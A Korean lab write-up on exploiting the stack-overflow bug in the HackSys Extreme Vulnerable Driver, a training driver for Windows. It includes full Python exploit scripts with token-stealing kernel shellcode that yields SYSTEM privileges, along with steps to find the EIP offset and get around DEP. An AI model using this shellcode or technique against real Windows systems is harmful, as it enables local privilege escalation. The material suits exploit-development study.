# Part 1. StackOverflow

[hacksysteam site] : https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/

## 1. Analysis
제공 된 HEVD drive의 소스코드 중 StackOverflow.c 코드를 보면 vulnerable code 와 secure code가 나뉘어 있다.

\`

        #ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));

        #else
        DbgPrint("[+] Triggering Stack Overflow\n");

        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
\`

* RtlCopyMemory(argv1.argv2,argv3); 은 argv3에 지정 한 길이만큼 argv2의 내용을 argv1의 주소에 Copy한다.
* Secure Note : argv3을 Copy 될 버퍼의 Size만큼 지정했기 때문에 Overflow에 안전하다.
* Vulnerability Note : Copy 될 Size를 UserBuffer(argv2)의 Size 만큼 지정해주면, 사용자가 입력한 Data의 length 만큼 Copy 되어 Overflow가 발생할 수 있다. 


스택 오버플로 모듈이 어떻게 그리고 어디서 트리거되는지 이해하기 위해 IDA Pro의 드라이버를 분석해보자

![1](https://user-images.githubusercontent.com/35731091/45018850-e1b94100-b065-11e8-9d51-ffc939c23413.png)

흐름을 보았을 때, IrpDeviceIoCtlHandler() function에서 StackOverflowIoctlHandler()를 Call, 최종적으로 취약점이 있는 TriggerStackOverflow() 까지 호출 하는 것을 볼 수 있다.

![2](https://user-images.githubusercontent.com/35731091/45018851-e1b94100-b065-11e8-9a67-9b592b250b50.png)

IrpDeviceIoCtlHandler()에서 StackOverflowIoctlHandler()를 거쳐, TriggerStackOverflow() 까지 호출하기 위해서는 IOCTL이 0x222003이 되어야한다.

IOCTL은 기본 운영 체제의 컴퓨터 User와 Kernel을 잇는 인터페이스의 일부이다.파일 디스크립터를 가지고 Device의 read/write와 기타 장치들을 control하기 위해 사용된다.
HW에 데이터를 read/write할 때 일반적으로 read(),write()함수의 동작만으로는 HW의 동작 상태에 따라 처리하지 못하는 데이터가 종종 발생하기 때문에, kernel 내부에서는 IOCTL을 이용한다.




![3](https://user-images.githubusercontent.com/35731091/45018853-e1b94100-b065-11e8-8a5c-7042eeabc963.png)




최종적으로, IOCTL이 0x222003이 되면  TriggerStackOverflow() 함수 내부의 memcpy()에서 취약점이 발생하여 exploitable 하다.

## 2.Exploit

앞서 1. Analysis 에서 취약한 부분(Vulnerability)을 호출하기 위해서는 IOCTL이 0x222003이 되야한다고 했다.
Python 언어의 DeviceIoControl() API를 이용하여 우리는 원하는 Driver와 서로 Interact 할 수 있다. 이를 이용하여 최종적으로 exploit이 가능하다.

### To call TriggerStackOverflow()


        import ctypes, sys
        from ctypes import *

        kernel32 = windll.kernel32 #Kernel Api를 load
        hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xC0000000,0,None,0x3,0,None) #Load 된 HEVD driver의 File descripter을 얻어오는 과정 

        print "Return : "+str(hevDevice)
        if not hevDevice or hevDevice == -1:
	        print "*** Couldn`t get Device Driver handle."
	        sys.exit(0)

        buf = "A"*0x800 #Kernel buffer size is 0x800, Therefore generate buffer overflow !
        bufLength = len(buf)

        print "Buf length: "+str(bufLength)
        kernel32.DeviceIoControl(hevDevice,0x222003,buf,bufLength,None,0,byref(c_ulong()),None) #IOCTL을 0x222003으로 지정하여, TriggerStackOverflow() 함수를 호출
\`

소스코드는 간단하여, 주석과 함께보면 이해하는데 조금 더 도움이 될 것 같다.


이 코드를 실행하기 전에, 우리가 분석을 위해서는 Break Point를 설정해주어야 한다.

> !sym noisy =>심볼파일 검색 과정을 출력

> .reload; => 심볼 로드

> ed Kd_DEFAULT_Mask 8; => Vista 이상 version의 명령이며, DBGprint를 활성화 시켜준다.

> bp HEVD!TriggerStackOverflow =>HEVD Driver의 TriggerStackOverflow 함수에 BP

![4](https://user-images.githubusercontent.com/35731091/45023119-cacc1c00-b070-11e8-9a48-1760ffa393c7.png)

![5](https://user-images.githubusercontent.com/35731091/45023120-cb64b280-b070-11e8-8067-83ae883f7d4b.png)

EIP가 0x41414141(AAAA)로 바뀐 것을 확인 할 수 있다.

이제 프로그램의 제어권을 얻을 수 있다. 메모리에 Shellcode를 쓴 뒤, EIP를 Shellcode가 있는 메모리의 시작주소로 바꾸어주면 exploit이 성공할 것이다.

## payload.c(Acquire system 권한) 
	
	pushad ; Save registers state
	; Start of Token Stealing Stub
	xor eax, eax ; Set ZERO
	mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
	; _KTHREAD is located at FS:[0x124]
 
	mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process
 
	mov ecx, eax ; Copy current process _EPROCESS structure
 
	mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4
 
	SearchSystemPID:
	mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
	sub eax, FLINK_OFFSET
	cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId
	jne SearchSystemPID
 
	mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token
	mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token
	; with SYSTEM process nt!_EPROCESS.Token
	; End of Token Stealing Stub
 
	popad ; Restore registers state
\`

이 Payload(shellcode)에 대해서는 따로 자세히 README.md 파일을 작성 할 것이다.

그렇다면 python exploit code 에서 'A'*0x900 중에서 어디 부분이 EIP를 덮었는지 알아야 한다.(metasploit, mona.py 등 많은 방법이 있지만 여기선 넘어가겠다.)

## EIP Search

        import ctypes, sys
        from ctypes import *

        kernel32 = windll.kernel32 #Kernel Api를 load
        hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",0xC0000000,0,None,0x3,0,None) #Load 된 HEVD driver의 File descripter을 얻어오는 과정 

        print "Return : "+str(hevDevice)
        if not hevDevice or hevDevice == -1:
	        print "*** Couldn`t get Device Driver handle."
	        sys.exit(0)

        buf = "A"*0x820+"B"*4 #Kernel buffer size is 0x800, Therefore generate buffer overflow !
        bufLength = len(buf)

        print "Buf length: "+str(bufLength)
        kernel32.DeviceIoControl(hevDevice,0x222003,buf,bufLength,None,0,byref(c_ulong()),None) #IOCTL을 0x222003으로 지정하여, TriggerStackOverflow() 함수를 호출
\`
![6](https://user-images.githubusercontent.com/35731091/45024326-b76e8000-b073-11e8-8c23-326625a28275.png)
![7](https://user-images.githubusercontent.com/35731091/45024327-b76e8000-b073-11e8-9560-0cfd6a2ba3f3.png)

EIP가 0x42424242('BBBB')로 바뀐 것을 볼 수 있다. 따라서 0x820 뒤에 0x4 byte가 EIP였다. 이제 이 값을 바꾸면 된다.

하지만 DEP이 걸려있어 stack에 실행방지 비트가 걸려있다. 따라서 VirtualAlloc() 함수를 이용하여, 실행가능한 메모리 영역을 할당해준 뒤 그곳에 RtlMoveMemory() API를 이용하여 shellcode를 복사해준 뒤, VirtualAlloc()의 Return 된 주소를 EIP에 넣어주면 된다.

## Exploit.py

	import ctypes, sys, struct
	from ctypes import *
 
	kernel32 = windll.kernel32
	hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
	if not hevDevice or hevDevice == -1:
    	print "*** Couldn't get Device Driver handle"
    	sys.exit(0)
 
	shellcode = ""
	shellcode += bytearray(
    	"\x60"                            # pushad
    	"\x31\xc0"                        # xor eax,eax
    	"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    	"\x8b\x40\x50"                    # mov eax,[eax+0x50]
    	"\x89\xc1"                        # mov ecx,eax
    	"\xba\x04\x00\x00\x00"            # mov edx,0x4
    	"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    	"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    	"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    	"\x75\xed"                        # jnz 0x1a
    	"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    	"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    	"\x61"                            # popad
	)
 
	ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
	buff = (c_char * len(shellcode)).from_buffer(shellcode)
	kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
	shellcode_final = struct.pack("<L",ptr)
 
	buf = "A"*2080 + shellcode_final
	bufLength = len(buf)
 
	kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
\`

![8](https://user-images.githubusercontent.com/35731091/45025408-61e7a280-b076-11e8-9884-03681fd92317.png)


하지만 이 Exploit.py 스크립트를 실행시키면 위 처럼 프로그램이 죽어버린다.
왜냐하면, Shellcode를 수행하고 난 뒤, 프로그램이 Resume 되지 않기 때문이다.

따라서 프로그램의 Resume을 위해 pop | ret 가젯을 추가로 Shellcode에 작성해주어야한다.

	import ctypes, sys, struct
	from ctypes import *
	from subprocess import *
 
	def main():
    		kernel32 = windll.kernel32
   	 	hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    		if not hevDevice or hevDevice == -1:
        		print "*** Couldn't get Device Driver handle"
        		sys.exit(0)
 
    		shellcode = ""
    		shellcode += bytearray(
        		"\x60"                            # pushad
        		"\x31\xc0"                        # xor eax,eax
        		"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        		"\x8b\x40\x50"                    # mov eax,[eax+0x50]
        		"\x89\xc1"                        # mov ecx,eax
        		"\xba\x04\x00\x00\x00"            # mov edx,0x4
        		"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
        		"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        		"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
        		"\x75\xed"                        # jnz 0x1a
        		"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
        		"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
        		"\x61"                            # popad
        		"\x31\xc0"                        # xor eax,eax
			
        		"\x5d"                            # pop ebp
        		"\xc2\x08\x00"                    # ret 0x8
    		)
 
    		ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
    		buff = (c_char * len(shellcode)).from_buffer(shellcode)
    		kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
    		shellcode_final = struct.pack("<L",ptr)
 
    		buf = "A"*2080 + shellcode_final
		bufLength = len(buf)
 
    		kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
    		Popen("start cmd", shell=True)
 
	if __name__ == "__main__":
    		main()
\`

![result](https://user-images.githubusercontent.com/35731091/45025668-0f5ab600-b077-11e8-90d1-c3d98f61726b.png)

System 권한을 획득했다.

